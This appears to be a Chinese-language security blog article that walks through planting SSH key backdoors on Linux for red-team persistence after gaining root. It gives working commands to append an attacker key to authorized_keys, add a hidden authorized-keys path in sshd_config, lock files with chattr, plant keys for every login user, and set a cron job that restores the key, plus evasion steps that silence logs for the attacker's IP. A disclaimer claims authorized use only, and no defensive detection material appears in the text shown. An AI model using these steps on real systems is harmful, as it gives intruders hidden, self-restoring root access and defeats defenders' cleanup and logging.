---
title: Linux 系统权限维持之 SSH 后门
url: https://mp.weixin.qq.com/s/SVFIlopkzxPKhJnLIXFSng
source: Doonsec's feed
date: 2026-04-11
fetch_date: 2026-04-12T04:45:18.853871
---

# Linux 系统权限维持之 SSH 后门

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ibzm8nWOdauOqpTfKibsmh1Zu27JITVe2U7zvYib6Uul1UO9jfjc81ZSM4uAKIDEicOwKlLoqI1IvibuDHE3PUPQWGWJgYDpS6q3kzQE4wzSf3QE/0?wx_fmt=jpeg)

# Linux 系统权限维持之 SSH 后门

原创

小智
小智

智榜样网络安全学习中心

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 免责声明

本文仅用于授权的企业安全测试、攻防研究与防护体系建设，严禁用于任何未授权的非法入侵行为。任何使用者违反国家法律法规造成的后果，由使用者自行承担，作者与平台不承担任何法律责任。

## 一、概述与实验环境说明

### 1.1 本文目标

SSH 协议是 Linux 服务器最常用的远程管理协议，基于非对称加密的公钥认证机制，是运维人员实现免密登录的常用方式，同时也是红队在 Linux 环境中实现长期权限控制的首选方案。相比反弹 Shell、SUID 提权等后门，SSH 密钥后门具备流量加密、系统原生支持、免杀性极强、稳定可靠的特点，哪怕目标主机修改了 root 用户密码、修复了初始打点的漏洞，只要公钥文件未被清除，红队就能随时重新获取系统最高权限。

本文从红队实战场景出发，覆盖从基础 SSH 密钥后门搭建、进阶隐蔽化改造、权限维持加固到蓝队规避的全流程操作，所有步骤均使用 Linux 系统原生工具完成，无需额外上传工具，同时配套对应的避坑提示、实战优化技巧与蓝队检测防御方案，帮助测试人员在合规范围内完成权限维持操作，同时理解对应的防护逻辑。

### 1.2 实验环境与前置条件

| 角色 | 系统环境 | IP 地址 | 关键配置 |
| --- | --- | --- | --- |
| 红队攻击机 | Kali Linux 2024.4 | 192.168.100.100 | 用于生成密钥对、发起 SSH 连接，预装 ssh-keygen、ssh 等原生工具 |
| 目标靶机 | Ubuntu 22.04 LTS | 192.168.100.200 | 企业环境主流服务器发行版，内核 5.15.0-94-generic，默认开启 SSH 服务，防火墙放行 22 端口流量 |

**前置条件**：红队已通过合法授权的渗透测试，获取目标靶机的 root 用户权限；攻击机与靶机内网互通，无边界安全设备拦截 22 端口的 SSH 流量。

【前置避坑提示】

SSH 公钥认证对文件权限有极其严格的要求，若权限配置不符合 SSH 的安全规则，公钥认证会直接失效，这是新手最容易踩坑的点。具体要求为：

1、root 用户的.ssh 目录权限必须为 700，仅所有者拥有读写执行权限

2、authorized\_keys 文件权限必须为 600，仅所有者拥有读写权限

3、.ssh 目录与 authorized\_keys 文件的所有者必须为对应用户，不能是其他用户

若权限配置错误，SSH 服务会直接拒绝公钥认证，且只会在 SSH 服务日志中记录错误，不会在客户端返回明确提示，导致后门失效。

## 二、基础 SSH 密钥后门搭建与实战

SSH 公钥认证的核心原理，是通过非对称加密算法生成一对密钥：公钥与私钥。公钥可以公开分发，写入目标靶机的授权密钥文件中；私钥由红队本地留存，严格保密。红队发起 SSH 连接时，靶机通过公钥加密随机数发送给客户端，客户端用私钥解密后返回验证，验证通过即可直接登录系统，无需输入用户密码。

### 2.1 实战操作步骤

1、红队攻击机生成SSH密钥对，选择ed25519算法（相比RSA更轻量、兼容性强、隐蔽性好）

![image-20260327120016884](https://mmbiz.qpic.cn/mmbiz/ibzm8nWOdauOEibQUH4CxzgsKAw2QEfCgQHQHwPt2ibHfP5DnGLMj4lBic8XxmqQ3qhicjGeVOgmGj5ejpLGrpaOKBJNV41Z5uiauEeUpGz7Vmuc0/640?wx_fmt=other&from=appmsg)

image-20260327120016884

2、查看生成的公钥内容，后续需要写入靶机的授权密钥文件

```
root@kali:~# cat /root/.ssh/backup_service_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7M1+6y/aUdrL8eX7q3j9sD6f5h4j3k2l1m0n9b8v7c6x5s4d3f2g1h0j9k8l7m6n5o4p3i2u1y0t backup-service@local
```

3、切换到目标靶机，创建.ssh目录，配置合规的权限

```
root@ubuntu:~# mkdir -p /root/.ssh
root@ubuntu:~# chmod 700 /root/.ssh
```

4、将红队攻击机生成的公钥，写入靶机的authorized\_keys授权文件

```
root@ubuntu:~# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7M1+6y/aUdrL8eX7q3j9sD6f5h4j3k2l1m0n9b8v7c6x5s4d3f2g1h0j9k8l7m6n5o4p3i2u1y0t backup-service@local" >> /root/.ssh/authorized_keys
```

5、配置authorized\_keys文件的合规权限，避免SSH认证失效

```
root@ubuntu:~# chmod 600 /root/.ssh/authorized_keys
root@ubuntu:~# chown root:root /root/.ssh/authorized_keys
```

6、确认靶机SSH服务开启公钥认证，修改配置后重启服务生效

```
root@ubuntu:~# sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
root@ubuntu:~# sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
root@ubuntu:~# systemctl restart sshd
```

7、验证SSH服务状态，确认服务正常运行

![image-20260327120112042](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauMA3WgNocjl6a2KUSLia5ibWEI1O4ereibpvI9BgMKZ82SgoBqaM4Db2pfrNhyzQ6E3wMnzt2ibUh4Ppb8zwfsKic8ZmNibiaDzJvibA6g/640?wx_fmt=other&from=appmsg)

image-20260327120112042

8、红队攻击机验证后门有效性，使用私钥直接登录靶机root用户，无需输入密码

![image-20260327120119685](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauOaPSHhzE5lqCS5PzSjbTTHJ10QfTRgrEDTROVN0F1otAdz9kBO1AOXpEJaB94qZx9x5OFb7JeR1W12gbic53FHUNiaibOSlKib2F0/640?wx_fmt=other&from=appmsg)

image-20260327120119685

### 2.2 实战优化技巧

基础的密钥后门虽然可用，但很容易被蓝队排查发现，这里补充两个基础优化技巧，提升后门的隐蔽性：

1、公钥写入时使用追加模式（>>），而非覆盖模式（>），避免覆盖靶机原有的运维公钥，导致运维人员发现异常

2、修改公钥的注释内容，不要使用红队、攻击、后门等敏感字样，优先使用 backup-service、system-monitor、auto-sync 等系统常用服务名称，降低被人工排查发现的概率

## 三、SSH 密钥后门进阶隐蔽化与权限维持加固

基础的密钥后门仅能实现免密登录，在实战中很容易被蓝队清理，比如运维人员发现未知公钥后直接删除，或者修改 SSH 配置关闭公钥认证，导致后门失效。本节讲解实战中高可用的进阶改造方案，实现后门的长期稳定运行，同时大幅提升隐蔽性，规避蓝队的常规排查。

### 3.1 公钥文件防删除锁定

蓝队排查到未知公钥后，最直接的操作就是删除 authorized\_keys 文件，我们可以通过 Linux 系统的文件扩展属性，锁定公钥文件，禁止任何用户（包括 root）修改、删除文件，哪怕 root 用户也无法直接删除，必须先解除锁定。

![image-20260327120148005](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauPKkyfoyiawysItTeMPUSVBq3rA8DbB1uYdBWn1jRBeTKxUvOqVG92NQYExMh5fcwuFuykWjZztsia8PrEzZgKMPlkcR8nmznrKU/640?wx_fmt=other&from=appmsg)

image-20260327120148005

【冷知识提示】

chattr 命令的 i 属性，是 Linux 系统的文件系统级扩展属性，比常规的 rwx 权限优先级更高，哪怕是 root 用户，也无法直接修改、删除锁定的文件，是红队实战中保护后门文件的常用手段。蓝队常规的 ls -l 命令无法看到扩展属性，必须使用 lsattr 命令才能查看，隐蔽性极强。

### 3.2 非默认路径授权密钥文件植入

蓝队的常规排查，只会检查 /root/.ssh/authorized\_keys 这个默认路径的授权文件，我们可以修改 SSH 服务的配置，新增一个非默认的授权密钥文件路径，放到蓝队很少排查的系统目录中，实现隐蔽的后门植入，哪怕默认路径的公钥被清理，非默认路径的公钥仍能正常使用。

1、修改SSH服务配置文件，新增非默认的授权密钥文件路径

```
# 新增的路径为/usr/local/lib/.system-libs/authorized_keys，属于系统库目录，蓝队极少排查
root@ubuntu:~# sed -i 's/#AuthorizedKeysFile .ssh/authorized_keys/AuthorizedKeysFile .ssh/authorized_keys /usr/local/lib/.system-libs/authorized_keys/g' /etc/ssh/sshd_config
```

2、创建非默认路径的目录，配置合规的权限

![image-20260327120326346](https://mmbiz.qpic.cn/mmbiz/ibzm8nWOdauPNdWZkv7v2Qp5GjVv2pVHy6icykFbEVD68zVjjqS4lJGYvh8SqXQvx9Iib9foIUzUx3drqQv6v9YqEsIwnL3kmoHZJm7VcSb1gU/640?wx_fmt=other&from=appmsg)

image-20260327120326346

3、将红队的公钥写入非默认路径的授权文件，配置合规权限并锁定

![image-20260327120336801](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauMUiaPQfApgMNxR4n8JEALibPj1OXffwUzV19lynckLb3ibw67p6Lq5C7C0qoT7oexSp74tmHn5SJqueC5o8oGaChpkyWtQnYPFdc/640?wx_fmt=other&from=appmsg)

image-20260327120336801

4、重启SSH服务，使配置生效

```
root@ubuntu:~# systemctl restart sshd
```

5、红队攻击机验证后门有效性，非默认路径的公钥可正常登录

![image-20260327120350071](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauMRibDbWF4pJrWosdRYX1EKhkCRUz7D7sdL16dsSDIFjz1W8U722twMdLWtTKGicREklPyo3COYtGsXWt30FKwx9OKicCMzQSlOMQ/640?wx_fmt=other&from=appmsg)

image-20260327120350071

### 3.3 多用户批量植入后门

实战中，仅植入 root 用户的后门风险较高，一旦 root 用户的 SSH 登录被限制，后门就会失效。我们可以批量遍历靶机上所有有登录权限、有 sudo 权限的用户，给每个用户都植入公钥后门，实现多路径的权限控制，哪怕单个用户的权限被限制，仍能通过其他用户登录系统，再提权到 root。

1、遍历靶机上所有可登录的用户，筛选出/bin/bash、/bin/sh登录shell的用户

![image-20260327120428600](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauOgpUdcJLQMqCr7Pjrbtjn2a3Ss6Z8bv6VFvBxTbfxlVupWAsYDEn0RRszFOEKQjanNyA1ib66yDdS8KuUlKG1G0SLJIicMiaYdic0/640?wx_fmt=other&from=appmsg)

image-20260327120428600

2、批量给所有可登录用户植入公钥后门，配置合规权限并锁定

![image-20260327120440444](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauO1hNibB5NfQh5cnxFhcZwGkSZmgE5KkMaLEaN40YEO1aw3A60aORL4dnibicD4lPsW9icXTJ4vpPduloyOgk9taRwicvufgicz3ZW4Q/640?wx_fmt=other&from=appmsg)

image-20260327120440444

3、验证普通用户的后门有效性，红队攻击机通过ubuntu用户登录靶机

![image-20260327120449008](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauOmwJwRKiarSX9MGxz8djwmcT5WTpicYjsz2yCI9xvbnFtMGP4RuXmv9wruM6YTgdaqBnCiahcjMzc6EiavOZCrq4kaiaPsZK7jCbdY/640?wx_fmt=other&from=appmsg)

image-20260327120449008

### 3.4 后门自动恢复机制

为了避免蓝队删除公钥文件导致后门失效，我们可以配置定时任务，每分钟检测公钥文件是否存在、是否包含我们的公钥，若被删除或修改，自动重新写入公钥并锁定文件，实现后门的持久化自动恢复。

1、创建自动恢复脚本，放到系统库目录，伪装成系统同步脚本

![image-20260327120536850](https://mmbiz.qpic.cn/mmbiz/ibzm8nWOdauNXjk7TRl3v4hjc8ibet9XIIbqnk5fvH83OpJxYvrGbSNG4eP1Iu13Xr7HfDjpSHicaGRwAib4VpPp6amibHwf9xhMEUicibiaCE6UUlY/640?wx_fmt=other&from=appmsg)

image-20260327120536850

2、给脚本添加执行权限，锁定脚本文件防止被删除

![image-20260327120550400](https://mmbiz.qpic.cn/mmbiz/ibzm8nWOdauOM3vs6ruXxI0PXOu11GUmTaAWbDrrAib1fzv0VwFG8gYBTib80ulpZiah5tHCyH8Y2Eo58Gm5fEXoqPdwTic5H0lD5qKMickbOEkNc/640?wx_fmt=other&from=appmsg)

image-20260327120550400

3、配置定时任务，每分钟执行一次恢复脚本，放到系统级cron目录，隐蔽性更强

![image-20260327120557510](https://mmbiz.qpic.cn/sz_mmbiz/ibzm8nWOdauPEsvibBNibAuPJ3LWyJ0RMoUA5RVbLJVQD0Y5ibhyMTm6ZHTIeQklUoibqQS9hVqaMfA52hos0B9yzU5y5tZg56dpwPFUFDebdLOQ/640?wx_fmt=other&from=appmsg)

image-20260327120557510

## 四、SSH 密钥后门的蓝队规避技巧

实战中，蓝队会通过 SSH 日志、登录行为、文件排查等方式发现后门，这里分享几个红队实战中常用的规避技巧，降低被蓝队发现的概率：

1、指定 IP 登录豁免日志记录：修改 SSH 服务配置，仅对红队的攻击 IP 不记录登录日志，其他 IP 的登录日志正常记录，蓝队查看日志时无法发现红队的登录痕迹。操作方式为在 sshd\_config 文件末尾添加如下配置：

```
Match Address 192.168.100.100
    SyslogFacility AUTHPRIV
    LogLevel QUIET
```

配置完成后重启 SSH 服务，来自 192.168.100.100 的 SSH 登录，不会在系统日志中留下任何记录。

2、使用非标准 SSH 端口：修改 SSH 服务的监听端口，从默认的 22 端口改为 443、8443 等常用端口，避免边界设备的端口扫描发现 SSH 服务，同时蓝队的常规排查只会关注 22 端口的 SSH 日志，容易忽略非标准端口的登录行为。

3、公钥配置强制命令限制：在公钥前面添加 command 参数，限制红队登录后仅执行指定的命令，避免蓝队蜜罐捕获到完整的 Shell 权限，同时降低异常操作被检测的概率。示例如下：

```
command="sudo /bin/bash" ssh-ed25519 AAAAC3NzaC1lZ...